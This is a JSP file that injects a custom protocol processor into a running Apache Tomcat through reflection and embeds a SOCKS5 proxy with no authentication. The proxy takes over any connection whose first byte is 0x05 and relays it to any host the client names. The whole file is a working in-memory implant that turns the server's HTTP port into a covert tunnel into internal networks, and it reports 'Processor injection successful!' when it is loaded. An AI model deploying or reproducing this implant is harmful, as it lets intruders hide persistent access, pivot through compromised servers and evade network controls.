<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.nio.channels.SocketChannel" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.net.InetAddress" %>
<%@ page import="java.net.InetSocketAddress" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.coyote.http11.Http11NioProtocol" %>
<%@ page import="org.apache.coyote.Adapter" %>
<%@ page import="org.apache.tomcat.util.net.AbstractEndpoint" %>
<%@ page import="org.apache.coyote.Processor" %>
<%@ page import="org.apache.coyote.http11.Http11Processor" %>
<%@ page import="java.util.Collections" %>
<%@ page import="org.apache.tomcat.util.net.SocketEvent" %>
<%@ page import="org.apache.tomcat.util.net.NioChannel" %>
<%@ page import="java.util.logging.Logger" %>
<%@ page import="java.util.logging.Level" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>

<%!
    public class Socks5Server {
        private static final byte SOCKS_VERSION = 0x05;
        private static final byte NO_AUTHENTICATION = 0x00;
        private static final byte CONNECT_COMMAND = 0x01;
        private static final byte IPV4_ADDRESS = 0x01;
        private static final byte DOMAIN_NAME = 0x03;
        private static final byte IPV6_ADDRESS = 0x04;

        private SocketWrapperBase<?> socketWrapper;
        private ByteBuffer readBuffer;
        private int peekPosition;


        public void handleClient(SocketChannel channel, SocketWrapperBase<?> wrapper) throws IOException {
            this.socketWrapper = wrapper;
            this.readBuffer = wrapper.getSocketBufferHandler().getReadBuffer();
            if (channel == null) {
                throw new IOException("不支持的socket类型");
            }

            try {
                // 处理认证方法协商
                if (!handleAuthenticationNegotiation(channel)) {
                    return;
                }

                // 处理连接请求
                if (!handleConnectionRequest(channel)) {
                    return;
                }

                // 开始转发数据
                handleDataTransfer(channel);
            } catch (Exception exception) {
                throw exception;
            } finally {
                try {
                    channel.close();
                } catch (IOException e) {
                    // 忽略关闭时的异常
                }
            }
        }

        private boolean handleAuthenticationNegotiation(SocketChannel channel) throws IOException {
            // 读取版本和方法数量
            ByteBuffer buffer = ByteBuffer.allocate(2);
            if (!peekRead(buffer, 2)) {
                return false;
            }
            buffer.flip();

            byte version = buffer.get();
            if (version != SOCKS_VERSION) {
                return false;
            }

            int numMethods = buffer.get() & 0xFF;

            // 读取认证方法列表
            buffer = ByteBuffer.allocate(numMethods);
            if (!peekRead(buffer, numMethods)) {
                return false;
            }

            // 确认是SOCKS5协议，消费之前peek的数据
            consumePeekedData();

            // 回复客户端，选择无认证方法
            buffer = ByteBuffer.allocate(2);
            buffer.put(SOCKS_VERSION);
            buffer.put(NO_AUTHENTICATION);
            buffer.flip();
            writeFully(channel, buffer);

            return true;
        }

        private void consumePeekedData() {
            if (this.peekPosition > 0) {
                // 将readBuffer的position向前移动peekPosition个位置，实际消费数据
                readBuffer.position(readBuffer.position() + this.peekPosition);
                // 重置peekPosition
                this.peekPosition = 0;
            }
        }

        private boolean handleConnectionRequest(SocketChannel channel) throws IOException {
            // 读取请求头
            ByteBuffer buffer = ByteBuffer.allocate(4);
            readFully(channel, buffer);
            buffer.flip();

            byte version = buffer.get();
            byte command = buffer.get();
            buffer.get(); // 保留字节
            byte addressType = buffer.get();

            if (version != SOCKS_VERSION || command != CONNECT_COMMAND) {
                sendResponse(channel, (byte) 0x07); // 命令不支持
                return false;
            }

            // 读取目标地址
            String targetHost;
            int targetPort;

            switch (addressType) {
                case IPV4_ADDRESS:
                    buffer = ByteBuffer.allocate(4);
                    readFully(channel, buffer);
                    buffer.flip();
                    byte[] ipv4 = new byte[4];
                    buffer.get(ipv4);
                    targetHost = InetAddress.getByAddress(ipv4).getHostAddress();
                    break;

                case DOMAIN_NAME:
                    buffer = ByteBuffer.allocate(1);
                    readFully(channel, buffer);
                    buffer.flip();
                    int domainLength = buffer.get() & 0xFF;

                    buffer = ByteBuffer.allocate(domainLength);
                    readFully(channel, buffer);
                    buffer.flip();
                    byte[] domain = new byte[domainLength];
                    buffer.get(domain);
                    targetHost = new String(domain);
                    break;

                case IPV6_ADDRESS:
                    buffer = ByteBuffer.allocate(16);
                    readFully(channel, buffer);
                    buffer.flip();
                    byte[] ipv6 = new byte[16];
                    buffer.get(ipv6);
                    targetHost = InetAddress.getByAddress(ipv6).getHostAddress();
                    break;

                default:
                    sendResponse(channel, (byte) 0x08); // 地址类型不支持
                    return false;
            }

            // 读取端口
            buffer = ByteBuffer.allocate(2);
            readFully(channel, buffer);
            buffer.flip();
            targetPort = ((buffer.get() & 0xFF) << 8) | (buffer.get() & 0xFF);

            try {
                // 连接目标服务器
                SocketChannel targetChannel = SocketChannel.open();
                targetChannel.connect(new InetSocketAddress(targetHost, targetPort));

                // 发送成功响应
                InetSocketAddress localAddress = (InetSocketAddress) targetChannel.getLocalAddress();
                byte[] bindAddress = localAddress.getAddress().getAddress();
                int bindPort = localAddress.getPort();

                ByteBuffer response = ByteBuffer.allocate(6 + bindAddress.length);
                response.put(SOCKS_VERSION);
                response.put((byte) 0x00); // 成功
                response.put((byte) 0x00); // 保留字节
                response.put((byte) (bindAddress.length == 4 ? IPV4_ADDRESS : IPV6_ADDRESS));
                response.put(bindAddress);
                response.putShort((short) bindPort);
                response.flip();
                writeFully(channel, response);

                // 开始转发数据
                startForwarding(channel, targetChannel);
                return true;

            } catch (IOException e) {
                sendResponse(channel, (byte) 0x04); // 主机不可达
                return false;
            }
        }

        private boolean peekRead(ByteBuffer rawBuffer, int expectedBytes) throws IOException {
            if (readBuffer == null) {
                throw new IOException("读取缓冲区未初始化");
            }

            // 检查是否有足够的数据
            if (readBuffer.remaining() < expectedBytes) {
                return false;
            }
            // 保存当前position
            int originalPosition = readBuffer.position();

            // 读取数据
            byte[] data = new byte[expectedBytes];
            readBuffer.get(data);

            this.peekPosition += expectedBytes;
            // 恢复position
            readBuffer.position(originalPosition);
            rawBuffer.put(data);
            return true;
        }

        private void handleDataTransfer(SocketChannel channel) {
            // 数据转发已经在handleConnectionRequest中启动
            try {
                while (channel.isOpen()) {
                    Thread.sleep(100);
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }

        private void startForwarding(final SocketChannel clientChannel, final SocketChannel targetChannel) {
            Thread clientToTarget = new Thread(new Runnable() {
                @Override
                public void run() {
                    forward(clientChannel, targetChannel);
                }
            });
            Thread targetToClient = new Thread(new Runnable() {
                @Override
                public void run() {
                    forward(targetChannel, clientChannel);
                }
            });

            clientToTarget.start();
            targetToClient.start();
        }

        private void forward(SocketChannel source, SocketChannel destination) {
            ByteBuffer buffer = ByteBuffer.allocate(8192);
            try {
                while (source.isOpen() && destination.isOpen()) {
                    buffer.clear();
                    int read = source.read(buffer);
                    if (read == -1) {
                        break;
                    }
                    if (read > 0) {
                        buffer.flip();
                        int written = 0;
                        while (buffer.hasRemaining()) {
                            written += destination.write(buffer);
                        }
                        if (written > 0) {
                        }
                    }
                }
            } catch (IOException e) {
                closeQuietly(source);
                closeQuietly(destination);
            }
        }

        private void sendResponse(SocketChannel channel, byte status) throws IOException {
            ByteBuffer response = ByteBuffer.allocate(10);
            response.put(SOCKS_VERSION);
            response.put(status);
            response.put((byte) 0x00); // 保留字节
            response.put(IPV4_ADDRESS);
            response.put(new byte[]{0, 0, 0, 0}); // 绑定地址
            response.putShort((short) 0); // 绑定端口
            response.flip();
            writeFully(channel, response);
        }

        private void readFully(SocketChannel channel, ByteBuffer buffer) throws IOException {
            int totalRead = 0;
            while (buffer.hasRemaining()) {
                int read = channel.read(buffer);
                if (read == -1) {
                    throw new IOException("连接已关闭");
                }
                totalRead += read;
            }
            if (totalRead > 0) {
            }
        }

        private void writeFully(SocketChannel channel, ByteBuffer buffer) throws IOException {
            int totalWritten = 0;
            while (buffer.hasRemaining()) {
                int written = channel.write(buffer);
                totalWritten += written;
            }
            if (totalWritten > 0) {
            }
        }

        private void closeQuietly(SocketChannel channel) {
            try {
                if (channel != null) {
                    channel.close();
                }
            } catch (IOException e) {
                // 忽略关闭时的异常
            }
        }
    }
%>

<%
    try {
        Field reqF = request.getClass().getDeclaredField("request");
        reqF.setAccessible(true);
        Request requestx = (Request) reqF.get(request);
        Connector connector = requestx.getConnector();
        Http11NioProtocol protocolHandler = (Http11NioProtocol) connector.getProtocolHandler();

        // 获取handler
        Field handler = protocolHandler.getClass().getSuperclass().getSuperclass().getSuperclass()
                .getDeclaredField("handler");
        handler.setAccessible(true);
        Object hd = handler.get(protocolHandler);

        // 获取proto
        Field proto = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler")
                .getDeclaredField("proto");
        proto.setAccessible(true);
        Http11NioProtocol protocol = (Http11NioProtocol) proto.get(hd);

        // 获取adapter和endpoint
        Adapter adapter = protocol.getAdapter();
        Field endpoint = protocol.getClass().getSuperclass().getSuperclass().getSuperclass()
                .getDeclaredField("endpoint");
        endpoint.setAccessible(true);
        AbstractEndpoint endpoint1 = (AbstractEndpoint) endpoint.get(protocol);

        // 创建新的协议处理器
        final Http11NioProtocol protocol2 = protocol;
        final AbstractEndpoint endpoint2 = endpoint1;
        Http11NioProtocol protocol1 = new Http11NioProtocol() {
            @Override
            protected Processor createProcessor() {
                Http11Processor http11Processor = new Http11Processor(protocol2.getMaxHttpHeaderSize(),
                        protocol2.getAllowHostHeaderMismatch(),
                        protocol2.getRejectIllegalHeaderName(), endpoint2,
                        protocol2.getMaxTrailerSize(),
                        Collections.singleton(protocol2.getAllowedTrailerHeaders()),
                        protocol2.getMaxExtensionSize(),
                        protocol2.getMaxSwallowSize(),
                        null,
                        protocol2.getSendReasonPhrase(),
                        protocol2.getRelaxedPathChars(),
                        protocol2.getRelaxedQueryChars()) {
                    @Override
                    public AbstractEndpoint.Handler.SocketState process(SocketWrapperBase<?> socketWrapper,
                                                                        SocketEvent status) throws IOException {
                        if (status == SocketEvent.OPEN_READ) {
                            // 获取原始Socket
                            NioChannel socket1 = (NioChannel) socketWrapper.getSocket();
                            SocketChannel ioChannel = socket1.getIOChannel();
//                                 使用NIO方式读取第一个字节
                            ByteBuffer buffer = ByteBuffer.allocate(0);
                            int read = socketWrapper.read(false, buffer);
                            if (read < 0) {
                                return super.process(socketWrapper, status);
                            }
                            ByteBuffer readBuffer = socketWrapper.getSocketBufferHandler().getReadBuffer();
                            byte b = readBuffer.get(0);
                            if (b == 0x05) {
                                Socks5Server socks5Server = new Socks5Server();
                                socks5Server.handleClient(ioChannel, socketWrapper);
                                return AbstractEndpoint.Handler.SocketState.CLOSED;
                            }
                        }
                        return super.process(socketWrapper, status);
                    }
                };
                http11Processor.setAdapter(adapter);
                return http11Processor;
            }
        };

        // 设置新的协议处理器
        protocol1.setAdapter(adapter);
        proto.set(hd, protocol1);

        // 重置处理器缓存
        Field recycledProcessors = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler")
                .getDeclaredField("recycledProcessors");
        recycledProcessors.setAccessible(true);
        Object o = recycledProcessors.get(hd);
        Field stack = o.getClass().getSuperclass().getDeclaredField("stack");
        stack.setAccessible(true);
        Object[] objects = new Object[128];
        stack.set(o, objects);
        Field index = o.getClass().getSuperclass().getDeclaredField("index");
        index.setAccessible(true);
        // todo： 单线程，这里需要去实时修改
        index.set(o, -3);
        response.getWriter().write("Processor injection successful!");
    } catch (Exception exception) {
        exception.printStackTrace();
        response.getWriter().write("Error: " + exception.getMessage());
    }
%>
<body>

</body>
</html>
